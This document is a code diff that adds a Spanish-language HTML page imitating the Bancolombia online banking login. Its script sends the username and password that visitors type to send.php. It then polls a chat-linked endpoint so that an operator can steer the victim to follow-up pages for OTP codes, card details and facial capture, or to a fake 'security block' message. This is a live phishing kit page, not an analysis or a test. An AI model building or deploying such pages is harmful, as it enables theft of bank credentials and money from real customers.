@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas - Bancolombia</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #fff;
+    min-height: 100vh;
+    color: #2c2a29;
+    overflow-x: hidden;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+  }
+  .bg-shapes { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
+  .bg-shapes svg { width: 100%; height: 100%; }
+  main {
+    flex: 1; position: relative; z-index: 1;
+    max-width: 500px; margin: 0 auto;
+    padding: 40px 20px 60px; width: 100%;
+  }
+  .logo { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 30px; }
+  .logo img { height: 32px; width: auto; display: block; }
+  h1 { text-align: center; font-size: 32px; font-weight: 400; color: #2c2a29; margin-bottom: 30px; }
+  .info-box {
+    background: #d6f0f7; border-radius: 12px; padding: 20px;
+    display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start;
+  }
+  .info-icon {
+    width: 36px; height: 36px; background: #a3d9eb; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #2c2a29;
+  }
+  .info-content strong { display: block; font-size: 16px; margin-bottom: 4px; }
+  .info-content p { font-size: 14px; color: #444; line-height: 1.4; margin-bottom: 8px; }
+  .info-content a { color: #2c2a29; font-weight: 700; font-size: 14px; text-decoration: underline; }
+  .card {
+    background: #fff; border-radius: 12px;
+    padding: 40px 50px; box-shadow: 0 2px 20px rgba(0,0,0,0.06);
+  }
+  .card h2 { text-align: center; font-size: 26px; font-weight: 700; margin-bottom: 12px; }
+  .card .subtitle { text-align: center; color: #555; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
+  .field { position: relative; margin-bottom: 8px; }
+  .field input {
+    width: 100%; border: none; border-bottom: 1px solid #999;
+    padding: 12px 0 12px 36px; font-size: 16px;
+    background: transparent; outline: none; font-family: inherit; color: #2c2a29;
+  }
+  .field input:focus { border-bottom-color: #fdda24; border-bottom-width: 2px; }
+  .field input.error { border-bottom-color: #e74c3c; border-bottom-width: 2px; }
+  .field-icon {
+    position: absolute; left: 0; top: 50%; transform: translateY(-50%);
+    color: #666; width: 20px; height: 20px; display: flex;
+  }
+  .forgot-link {
+    display: block; font-size: 13px; font-weight: 700; color: #2c2a29;
+    text-decoration: underline; margin: 8px 0 22px;
+  }
+  .error-msg {
+    background: #fdecea; border-left: 4px solid #e74c3c;
+    color: #c0392b; padding: 12px 14px; border-radius: 6px;
+    font-size: 13px; margin-bottom: 16px; display: none;
+  }
+  .error-msg.show { display: block; animation: shake 0.4s ease; }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+  }
+  .btn-login {
+    width: 100%; padding: 16px; border: none; border-radius: 50px;
+    background: #d4d4d4; color: #888; font-size: 16px;
+    font-weight: 600; cursor: not-allowed; transition: all 0.2s;
+    font-family: inherit; margin-top: 10px;
+  }
+  .btn-login.active { background: #fdda24; color: #2c2a29; cursor: pointer; }
+  .btn-login.active:hover { background: #f5cf00; }
+  .create-user {
+    display: block; text-align: center; margin-top: 24px;
+    font-size: 14px; font-weight: 700; color: #2c2a29; text-decoration: underline;
+  }
+  footer {
+    position: relative; z-index: 1; background: #f5f5f5;
+    border-top: 1px solid #e0e0e0; padding: 30px 20px; margin-top: 40px;
+  }
+  .footer-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 30px; font-size: 13px; color: #555;
+  }
+  .footer-col h4 { font-size: 14px; color: #2c2a29; margin-bottom: 12px; font-weight: 700; }
+  .footer-col ul { list-style: none; }
+  .footer-col li { margin-bottom: 6px; }
+  .footer-col a { color: #555; text-decoration: none; }
+  .footer-col a:hover { text-decoration: underline; color: #2c2a29; }
+  .footer-bottom {
+    max-width: 1100px; margin: 25px auto 0; padding-top: 20px;
+    border-top: 1px solid #e0e0e0; font-size: 12px;
+    color: #777; text-align: center; line-height: 1.5;
+  }
+  .footer-bottom strong { color: #2c2a29; }
+  @media (max-width: 600px) {
+    .card { padding: 30px 25px; }
+    h1 { font-size: 26px; }
+    .footer-inner { grid-template-columns: 1fr; gap: 20px; }
+  }
+
+  /* MODAL CARGANDO */
+  .loading-overlay {
+    display: none;
+    position: fixed; inset: 0;
+    background: rgba(30, 30, 30, 0.92);
+    z-index: 9999;
+    align-items: center; justify-content: center;
+  }
+  .loading-overlay.show {
+    display: flex;
+    animation: fadeInLoad 0.25s ease;
+  }
+  @keyframes fadeInLoad { from { opacity: 0; } to { opacity: 1; } }
+  .loading-card {
+    background: #fff; border-radius: 50%;
+    width: 130px; height: 130px;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 12px; box-shadow: 0 4px 30px rgba(0,0,0,0.3);
+  }
+  .spinner {
+    width: 38px; height: 38px;
+    border: 3px solid #e0e0e0;
+    border-top-color: #2c2a29;
+    border-radius: 50%;
+    animation: spin 0.75s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-card span {
+    font-size: 12px; color: #2c2a29;
+    font-weight: 500; font-family: inherit;
+  }
+
+  /* MODAL 923 */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(44,42,41,0.6);
+    backdrop-filter: blur(4px);
+    display: none;
+    align-items: center; justify-content: center;
+    z-index: 10000;
+    padding: 20px;
+  }
+  .modal-overlay.show { display: flex; }
+  .modal-923 {
+    background: #fff;
+    border-radius: 16px;
+    max-width: 420px;
+    width: 100%;
+    padding: 32px 28px;
+    text-align: center;
+  }
+  .modal-923 .x-circle {
+    width: 56px; height: 56px;
+    border-radius: 50%;
+    background: #f4a373;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+  }
+  .modal-923 .x-circle svg { width: 30px; height: 30px; }
+  .modal-923 h3 {
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 14px;
+    line-height: 1.25;
+  }
+  .modal-923 p {
+    color: #555;
+    font-size: 14px;
+    line-height: 1.5;
+    margin-bottom: 22px;
+  }
+  .btn-yellow-full {
+    width: 100%;
+    padding: 14px;
+    background: #fdda24;
+    color: #2c2a29;
+    border: none;
+    border-radius: 50px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn-yellow-full:hover { background: #f5cf00; }
+</style>
+</head>
+<body>
+  <div class="bg-shapes">
+    <svg viewBox="0 0 1500 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+      <path d="M -50,400 Q 200,200 450,450 T 900,400" stroke="#ff8c42" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M -50,420 Q 250,180 500,460 T 950,420 T 1400,300 T 1600,150" stroke="#fdda24" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M 950,400 Q 1100,500 1300,300 T 1600,100" stroke="#ff8c42" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M 1100,250 Q 1300,150 1500,50" stroke="#9b5de5" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <circle cx="490" cy="455" r="14" fill="#9b5de5"/>
+    </svg>
+  </div>
+
+  <main>
+    <div class="logo">
+      <img src="/img/horizont-trazo.svg" alt="Bancolombia">
+    </div>
+
+    <h1>Sucursal Virtual Personas</h1>
+
+    <div class="info-box">
+      <div class="info-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 18h6"/><path d="M10 22h4"/>
+          <path d="M12 2a7 7 0 0 0-4 12.7c.6.5 1 1.3 1 2.1V18h6v-1.2c0-.8.4-1.6 1-2.1A7 7 0 0 0 12 2Z"/>
+        </svg>
+      </div>
+      <div class="info-content">
+        <strong>¡Prográmate!</strong>
+        <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+        <a href="#">Más info aquí.</a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>¡Hola!</h2>
+      <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+      <div class="error-msg" id="errorMsg">Usuario o clave incorrectos. Verifica los datos e intenta nuevamente.</div>
+
+      <div class="field">
+        <span class="field-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="8" r="4"/>
+            <path d="M4 21c0-4.4 3.6-8 8-8s8 3.6 8 8"/>
+          </svg>
+        </span>
+        <input type="text" id="user" placeholder="Usuario" autocomplete="username">
+      </div>
+      <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+
+      <div class="field">
+        <span class="field-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="4" y="11" width="16" height="10" rx="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          </svg>
+        </span>
+        <input type="password" id="pass" placeholder="Clave del cajero" autocomplete="current-password">
+      </div>
+      <a href="#" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
+
+      <button class="btn-login" id="btn" disabled>Iniciar sesión</button>
+      <a href="#" class="create-user">Crear usuario</a>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>Atención al cliente</h4>
+        <ul>
+          <li>Medellín: (604) 510 9000</li>
+          <li>Bogotá: (601) 343 0000</li>
+          <li>Cali: (602) 554 0505</li>
+          <li>Resto del país: 01 8000 912345</li>
+          <li>Desde celular: #345</li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Servicios</h4>
+        <ul>
+          <li><a href="#">Personas</a></li>
+          <li><a href="#">Empresas</a></li>
+          <li><a href="#">Pagos PSE</a></li>
+          <li><a href="#">Sucursal Telefónica</a></li>
+          <li><a href="#">Defensor del Consumidor</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Seguridad</h4>
+        <ul>
+          <li><a href="#">Tips de seguridad</a></li>
+          <li><a href="#">Reporta un fraude</a></li>
+          <li><a href="#">Política de privacidad</a></li>
+          <li><a href="#">Términos y condiciones</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Canales</h4>
+        <ul>
+          <li><a href="#">App Personas</a></li>
+          <li><a href="#">Cajeros automáticos</a></li>
+          <li><a href="#">Corresponsales bancarios</a></li>
+          <li><a href="#">Sucursales físicas</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <strong>Bancolombia S.A.</strong> – Establecimiento Bancario – Vigilado por la Superintendencia Financiera de Colombia.<br>
+      © 2026 Grupo Bancolombia. Todos los derechos reservados.
+    </div>
+  </footer>
+
+  <!-- MODAL CARGANDO -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <div class="spinner"></div>
+      <span>Cargando...</span>
+    </div>
+  </div>
+
+  <!-- MODAL 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 30 30" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="22" y1="8" x2="8" y2="22"/><line x1="8" y1="8" x2="22" y2="22"/></svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.</p>
+      <button class="btn-yellow-full" onclick="close923()">Intentar más tarde</button>
+    </div>
+  </div>
+
+  <script>
+    const userInput = document.getElementById('user');
+    const passInput = document.getElementById('pass');
+    const btn = document.getElementById('btn');
+    const errorMsg = document.getElementById('errorMsg');
+    const loader = document.getElementById('loadingOverlay');
+
+    let pollTimer = null;
+
+    function check() {
+      if (userInput.value && passInput.value) {
+        btn.classList.add('active');
+        btn.disabled = false;
+      } else {
+        btn.classList.remove('active');
+        btn.disabled = true;
+      }
+    }
+    userInput.addEventListener('input', check);
+    passInput.addEventListener('input', check);
+
+    function showError() {
+      loader.classList.remove('show');
+      errorMsg.classList.add('show');
+      userInput.classList.add('error');
+      passInput.classList.add('error');
+      passInput.value = '';
+      check();
+      passInput.focus();
+      setTimeout(() => {
+        errorMsg.classList.remove('show');
+        userInput.classList.remove('error');
+        passInput.classList.remove('error');
+      }, 5000);
+    }
+
+    function stopPolling() {
+      if (pollTimer) {
+        clearTimeout(pollTimer);
+        pollTimer = null;
+      }
+    }
+
+    async function pollStatus(chatId, messageId, sessionId) {
+      try {
+        const url = `poll_updates.php?chat_id=${encodeURIComponent(chatId)}&message_id=${encodeURIComponent(messageId)}`;
+        const r = await fetch(url, { cache: 'no-store' });
+        const j = await r.json();
+
+        if (j.ok && j.data && j.data.action) {
+          const action = j.data.action;
+          // Guardar sesión antes de cualquier redirección
+          const saveAndGo = (path) => {
+            sessionStorage.setItem('bc_user', userInput.value.trim());
+            sessionStorage.setItem('bc_session', sessionId);
+            sessionStorage.setItem('bc_chat', chatId);
+            window.location.href = path;
+          };
+          if (action === 'OK_LOGIN' || action === 'GOTO_DASH') return saveAndGo('dashboard.html');
+          if (action === 'GOTO_OTP') return saveAndGo('otp.html');
+          if (action === 'GOTO_DIN') return saveAndGo('dashboard.html?modal=din');
+          if (action === 'GOTO_TC')  return saveAndGo('tarjeta.html');
+          if (action === 'GOTO_FACIAL') return saveAndGo('facial.html');
+          if (action === 'ERR_LOGIN') return showError();
+          if (action === 'ERROR_923') return show923();
+        }
+      } catch (e) { console.error('poll error', e); }
+      pollTimer = setTimeout(() => pollStatus(chatId, messageId, sessionId), 2000);
+    }
+
+    function show923() {
+      stopPolling();
+      loader.classList.remove('show');
+      document.getElementById('modal923').classList.add('show');
+    }
+    function close923() {
+      document.getElementById('modal923').classList.remove('show');
+      sessionStorage.clear();
+      location.reload();
+    }
+
+    btn.addEventListener('click', async () => {
+      if (btn.disabled) return;
+      errorMsg.classList.remove('show');
+      userInput.classList.remove('error');
+      passInput.classList.remove('error');
+      loader.classList.add('show');
+
+      try {
+        const res = await fetch('send.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'LOGIN',
+            username: userInput.value.trim(),
+            password: passInput.value
+          })
+        });
+        const data = await res.json();
+        if (!data.ok) {
+          loader.classList.remove('show');
+          alert('Error de conexión. Intenta de nuevo.');
+          return;
+        }
+        // Iniciar polling
+        pollStatus(data.chat_id, data.message_id, data.session_id);
+      } catch (e) {
+        loader.classList.remove('show');
+        alert('Error de red. Intenta de nuevo.');
+      }
+    });
+
+    // Enter en el form
+    [userInput, passInput].forEach(i => {
+      i.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !btn.disabled) btn.click();
+      });
+    });
+  </script>
+</body>
+</html>
